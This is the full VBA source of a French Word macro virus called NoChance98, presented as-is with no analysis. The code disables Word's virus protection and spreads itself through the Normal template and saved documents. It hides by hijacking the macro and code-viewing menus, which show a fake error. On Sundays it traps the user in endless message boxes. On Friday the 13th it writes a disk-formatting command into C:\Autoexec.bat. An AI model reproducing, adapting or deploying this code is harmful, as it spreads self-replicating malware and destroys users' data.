   Attribute VB_Name = "NoChance98"
   Sub AutoExec()
   Attribute AutoExec.VB_Description = "Macro créée par ZeMacroKiller98"
   Attribute AutoExec.VB_ProcData.VB_Invoke_Func = "Virus.NoChance98.AutoExec"
   '
   ' Macro créée par ZeMacroKiller
   ' La Charge
   Application.EnableCancelKey = wdCancelDisabled  'Disable Ctrl + Attn
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorPayload
   Dim MyTime, MyDate, MyWeek
   MyDate = Date
   D$ = Mid(MyDate, 1, 2)
   MyTime = Time
   Th$ = Mid(MyTime, 1, 2)
   Tm$ = Mid(MyTime, 4, 2)
   Ts$ = Mid(MyTime, 7, 2)
   MyWeek = WeekDay(MyDate, vbMonday)
   If MyWeek = "7" Then
   Message:
       MsgBox "On ne travaille pas le Dimanche...", vbExclamation, "C'est Dimanche et j'ai l'intention de me relaxer!"
   GoTo Message
   End If
   If Th$ = "13" Then
       StatusBar = "C'est la CHANCE de ta vie...!!!"
   End If
   If Tm$ = "13" Then
       StatusBar = "La Chance tourne pour toi...!!!"
   End If
   If Ts$ = "13" Then
       StatusBar = "Tu as beaucoup de CHANCE...!!!"
   End If
   If (MyWeek = "5") And (D$ = "13") Then
       MsgBox "Pas de chance pour toi, aujourd'hui...", vbExclamation, "Vendredi 13"
       MsgBox "Je vais formater ton disque dur C: ", vbCritical, "Vendredi 13"
       MsgBox "C'est une blague...", vbInformation, "Vendredi 13"
       MsgBox "HAHAHAHAHA!", vbExclamation, "Vendredi 13"
       MsgBox "Soyez pas supersticieux...", vbExclamation, "Vendredi 13"
       Open "C:\Autoexec.bat" For Append As #1
       Print #1, "Cls"
       Print #1, "@Echo on"
       Print #1, "@Echo Tu te rappelle du message de Word:"
       Print #1, "@Echo Je vais formater votre disque dur C:"
       Print #1, "@Echo C'est pas une blague, c'est la vérité..."
       Print #1, "@Echo N'oublies pas que nous sommes VENDREDI 13..."
       Print #1, "@Echo Dommage pour toi"
       Print #1, "@Echo On y va..."
       Print #1, "@Echo y|Format c: /u"
   End If
   ErrorPayload:
   End Sub
   Sub AutoOpen()
   Attribute AutoOpen.VB_Description = "Macro créee par ZeMacroKiller98"
   Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Virus.NoChance98.AutoOpen"
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorInfectNormalTemplate
       Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="NoChance98", Object:=wdOrganizerObjectProjectItems
       Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
       Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
   StatusBar = "Virus NoChance98 de ZeMacroKiller"
   ErrorInfectNormalTemplate:
   End Sub
   Sub FileSaveAs()
   Attribute FileSaveAs.VB_Description = "Macro créee par ZeMacroKiller98"
   Attribute FileSaveAs.VB_ProcData.VB_Invoke_Func = "Virus.NoChance98.FileSaveAs"
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
       Dialogs(wdDialogFileSaveAs).Show
   On Error GoTo ErrorFSA
   If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
       ActiveDocument.SaveAs Fileformat:=wdFormatTemplate
       Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="NoChance98", Object:=wdOrganizerObjectProjectItems
       Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm900", Object:=wdOrganizerObjectProjectItems
       Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="UserForm999", Object:=wdOrganizerObjectProjectItems
       ActiveDocument.Save
   End If
   ErrorFSA:
   End Sub
   Sub FileTemplates()
   Attribute FileTemplates.VB_Description = "Macro créee par ZeMacroKiller98"
   Attribute FileTemplates.VB_ProcData.VB_Invoke_Func = "Virus.NoChance98.FileTemplates"
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorFT
       UserForm900.Show
   ErrorFT:
   End Sub
   Sub ToolsMacro()
   Attribute ToolsMacro.VB_Description = "Macro créee par ZeMacroKiller98"
   Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = "Virus.NoChance98.ToolsMacro"
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorTM
       UserForm999.Show
   ErrorTM:
   End Sub
   Sub ViewVBCode()
   Attribute ViewVBCode.VB_Description = "Macro créee par ZeMacroKiller98"
   Attribute ViewVBCode.VB_ProcData.VB_Invoke_Func = "Virus.NoChance98.ViewVBCode"
   Application.EnableCancelKey = wdCancelDisabled
   WordBasic.DisableAutoMacros 0
   Options.VirusProtection = False
   On Error GoTo ErrorVVBC
       MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
   ErrorVVBC:
   End Sub
